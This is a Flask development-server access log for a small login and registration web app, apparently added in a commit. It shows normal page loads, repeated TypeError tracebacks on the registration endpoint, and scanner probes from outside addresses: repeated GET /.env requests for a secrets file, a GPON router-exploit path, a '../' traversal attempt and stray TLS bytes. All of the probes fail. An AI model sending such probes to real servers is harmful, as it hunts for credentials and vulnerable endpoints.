+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET /static/js/index.js HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET /Good_Say HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:01:09] "POST /User/Register HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:01:12] "POST /User/Register HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:01:15] "POST /User/Register HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:01:22] "POST /User/Register HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:01:33] "POST /User/Register HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:01:41] "POST /User/Register HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:01:57] "POST /User/Register HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2548, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2528, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2525, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1822, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1820, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1796, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/usr/local/lib/python3.10/dist-packages/asgiref/sync.py", line 218, in __call__
+    return call_result.result()
+  File "/usr/lib/python3.10/concurrent/futures/_base.py", line 451, in result
+    return self.__get_result()
+  File "/usr/lib/python3.10/concurrent/futures/_base.py", line 403, in __get_result
+    raise self._exception
+  File "/usr/local/lib/python3.10/dist-packages/asgiref/sync.py", line 284, in main_wrap
+    result = await self.awaitable(*args, **kwargs)
+  File "/home/ubuntu/dailylog/Login/app.py", line 198, in user_create
+    return c['errorMessage']
+TypeError: byte indices must be integers or slices, not str
+125.180.181.238 - - [08/Dec/2022 19:02:01] "POST /User/Register HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:02:11] "POST /User/Register HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2548, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2528, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2525, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1822, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1820, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1796, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/usr/local/lib/python3.10/dist-packages/asgiref/sync.py", line 218, in __call__
+    return call_result.result()
+  File "/usr/lib/python3.10/concurrent/futures/_base.py", line 451, in result
+    return self.__get_result()
+  File "/usr/lib/python3.10/concurrent/futures/_base.py", line 403, in __get_result
+    raise self._exception
+  File "/usr/local/lib/python3.10/dist-packages/asgiref/sync.py", line 284, in main_wrap
+    result = await self.awaitable(*args, **kwargs)
+  File "/home/ubuntu/dailylog/Login/app.py", line 198, in user_create
+    return c['errorMessage']
+TypeError: byte indices must be integers or slices, not str
+125.180.181.238 - - [08/Dec/2022 19:02:20] "POST /User/Register HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:02:44] "POST /User/Register HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2548, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2528, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2525, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1822, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1820, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1796, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/usr/local/lib/python3.10/dist-packages/asgiref/sync.py", line 218, in __call__
+    return call_result.result()
+  File "/usr/lib/python3.10/concurrent/futures/_base.py", line 451, in result
+    return self.__get_result()
+  File "/usr/lib/python3.10/concurrent/futures/_base.py", line 403, in __get_result
+    raise self._exception
+  File "/usr/local/lib/python3.10/dist-packages/asgiref/sync.py", line 284, in main_wrap
+    result = await self.awaitable(*args, **kwargs)
+  File "/home/ubuntu/dailylog/Login/app.py", line 198, in user_create
+    return c['errorMessage']
+TypeError: byte indices must be integers or slices, not str
+125.180.181.238 - - [08/Dec/2022 19:03:07] "POST /User/Register HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:03:34] "POST /User/Register HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2548, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2528, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 2525, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1822, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1820, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1796, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/usr/local/lib/python3.10/dist-packages/asgiref/sync.py", line 218, in __call__
+    return call_result.result()
+  File "/usr/lib/python3.10/concurrent/futures/_base.py", line 451, in result
+    return self.__get_result()
+  File "/usr/lib/python3.10/concurrent/futures/_base.py", line 403, in __get_result
+    raise self._exception
+  File "/usr/local/lib/python3.10/dist-packages/asgiref/sync.py", line 284, in main_wrap
+    result = await self.awaitable(*args, **kwargs)
+  File "/home/ubuntu/dailylog/Login/app.py", line 198, in user_create
+    return c['errorMessage']
+TypeError: byte indices must be integers or slices, not str
+125.180.181.238 - - [08/Dec/2022 19:03:50] "POST /User/Register HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:04:55] "GET /register HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:04:55] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:04:55] "GET /static/css/joinstyle.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:04:58] "GET /register HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:04:58] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:04:58] "GET /static/css/joinstyle.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:09] "GET /Login/find_account HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:05:09] "GET /static/css/login.css HTTP/1.1" 404 -
+211.187.196.252 - - [08/Dec/2022 19:05:09] "GET /static/css/id,pw.css HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:05:09] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:16] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:05:16] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:16] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:16] "GET /static/js/index.js HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:16] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:16] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:16] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:16] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:16] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:17] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:05:17] "GET /Good_Say HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:05:19] "GET /Login HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:05:19] "GET /static/css/Login.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:06:09] "GET /Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:06:10] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:06:10] "GET /static/css/profile.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:06:10] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:06:10] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:06:10] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:06:10] "GET /Login?loc%20=%20Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:06:11] "GET /static/css/Login.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:11:20] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:11:20] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:11:20] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:11:20] "GET /static/js/index.js HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:11:20] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:11:20] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:11:20] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:11:20] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:11:20] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:11:20] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:11:21] "GET /Good_Say HTTP/1.1" 200 -
+95.214.235.205 - - [08/Dec/2022 19:24:47] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [08/Dec/2022 19:24:51] "POST / HTTP/1.1" 405 -
+125.180.181.238 - - [08/Dec/2022 19:29:30] "GET / HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:29:30] "GET /static/css/reset.css HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:29:30] "GET /static/css/style.css HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:29:30] "GET /static/js/index.js HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:29:30] "GET /static/assets/like.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:29:30] "GET /static/assets/search.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:29:30] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:29:30] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:29:30] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:29:30] "GET /static/assets/call.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:29:31] "GET /Good_Say HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:30:05] "GET /Mypage HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:30:05] "GET /static/css/reset.css HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:30:05] "GET /static/css/profile.css HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:30:05] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:30:05] "GET /static/assets/search.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:30:05] "GET /static/assets/like.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:30:05] "GET /Login?loc%20=%20Mypage HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:30:06] "GET /static/css/Login.css HTTP/1.1" 304 -
+192.155.90.220 - - [08/Dec/2022 19:55:24] code 400, message Bad request version ('À\x14À')
+192.155.90.220 - - [08/Dec/2022 19:55:24] "   6k+·½ÔîSË+¶ñªî¬¨ÃÜ¥ÝbAq×¨£   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+135.125.217.54 - - [08/Dec/2022 20:00:31] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [08/Dec/2022 20:00:31] "GET /.env HTTP/1.1" 404 -
+220.64.106.7 - - [08/Dec/2022 20:14:36] "GET / HTTP/1.1" 200 -
+159.89.121.128 - - [08/Dec/2022 21:09:02] code 400, message Bad request version ('À\x14À')
+159.89.121.128 - - [08/Dec/2022 21:09:02] " {  w3Ó;¨¬àpñN$#ÔíêåèE§àl¿  À/À+ÀÀÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+159.89.121.128 - - [08/Dec/2022 21:09:03] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ñy~z\x84\x91É2\x05\x87µcÙê¼.\x11pç¼×ù\\a\x08x0(\x95}1Ï\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+159.89.121.128 - - [08/Dec/2022 21:09:03] " {  wÑy~zÉ2µcÙê¼.pç¼×ù\ax0(}1Ï  À/À+ÀÀÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+159.89.121.128 - - [08/Dec/2022 21:09:03] "GET / HTTP/1.1" 200 -
+135.125.217.54 - - [08/Dec/2022 21:12:28] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [08/Dec/2022 21:12:28] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [08/Dec/2022 21:20:28] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [08/Dec/2022 21:20:29] "POST / HTTP/1.1" 405 -
+210.220.73.250 - - [08/Dec/2022 21:45:41] "GET / HTTP/1.1" 200 -
+121.53.80.4 - - [08/Dec/2022 21:45:41] "GET / HTTP/1.1" 200 -
+121.53.80.251 - - [08/Dec/2022 21:45:52] "GET / HTTP/1.1" 200 -
+45.79.172.21 - - [08/Dec/2022 22:02:58] code 400, message Bad request version ('Òz')
+45.79.172.21 - - [08/Dec/2022 22:02:58] "   '@ûqP(.@j$&[¡htÒz" HTTPStatus.BAD_REQUEST -
+185.254.196.115 - - [08/Dec/2022 23:10:28] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [08/Dec/2022 23:10:29] "POST / HTTP/1.1" 405 -
+64.62.197.111 - - [08/Dec/2022 23:28:33] "GET / HTTP/1.1" 200 -
+64.62.197.112 - - [08/Dec/2022 23:30:54] "GET /favicon.ico HTTP/1.1" 404 -
+135.125.217.54 - - [08/Dec/2022 23:31:34] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [08/Dec/2022 23:31:34] "GET /.env HTTP/1.1" 404 -
+135.125.217.54 - - [08/Dec/2022 23:47:32] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [08/Dec/2022 23:47:32] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [08/Dec/2022 23:56:56] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [08/Dec/2022 23:56:59] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [09/Dec/2022 00:02:11] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [09/Dec/2022 00:02:12] "POST / HTTP/1.1" 405 -
+15.235.118.56 - - [09/Dec/2022 00:07:05] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 00:07:08] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 00:09:54] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 00:09:57] "GET /.env HTTP/1.1" 404 -
+172.104.11.4 - - [09/Dec/2022 00:11:28] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+172.104.11.4 - - [09/Dec/2022 00:11:28] "   ©VxÖEâ6ê" HTTPStatus.BAD_REQUEST -
+106.75.75.232 - - [09/Dec/2022 00:16:15] "GET / HTTP/1.1" 200 -
+114.236.231.132 - - [09/Dec/2022 00:19:34] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 00:19:41] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 00:19:44] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 00:24:06] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 00:24:09] "GET /.env HTTP/1.1" 404 -
+162.142.125.212 - - [09/Dec/2022 00:24:50] "GET / HTTP/1.1" 200 -
+162.142.125.212 - - [09/Dec/2022 00:24:51] "GET / HTTP/1.1" 200 -
+162.142.125.212 - - [09/Dec/2022 00:24:51] code 505, message Invalid HTTP version (2.0)
+162.142.125.212 - - [09/Dec/2022 00:24:51] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+162.142.125.212 - - [09/Dec/2022 00:24:51] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+162.142.125.212 - - [09/Dec/2022 00:24:52] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+162.142.125.212 - - [09/Dec/2022 00:24:52] "GET /favicon.ico HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 00:26:24] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 00:26:27] "GET /.env HTTP/1.1" 404 -
+185.142.236.43 - - [09/Dec/2022 00:27:16] "GET / HTTP/1.1" 200 -
+185.142.236.43 - - [09/Dec/2022 00:27:18] "GET /robots.txt HTTP/1.1" 404 -
+185.142.236.43 - - [09/Dec/2022 00:27:20] "GET /sitemap.xml HTTP/1.1" 404 -
+185.142.236.43 - - [09/Dec/2022 00:27:22] "GET /.well-known/security.txt HTTP/1.1" 404 -
+185.142.236.43 - - [09/Dec/2022 00:27:23] "GET /static/assets/house.svg HTTP/1.1" 200 -
+185.142.236.43 - - [09/Dec/2022 00:27:31] code 400, message Bad request syntax ('\x03\\\x02\x92c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+185.142.236.43 - - [09/Dec/2022 00:27:31] "\c                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            " HTTPStatus.BAD_REQUEST -
+134.122.88.217 - - [09/Dec/2022 00:29:32] "GET / HTTP/1.0" 200 -
+15.235.118.56 - - [09/Dec/2022 00:47:43] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 00:47:46] "GET /.env HTTP/1.1" 404 -
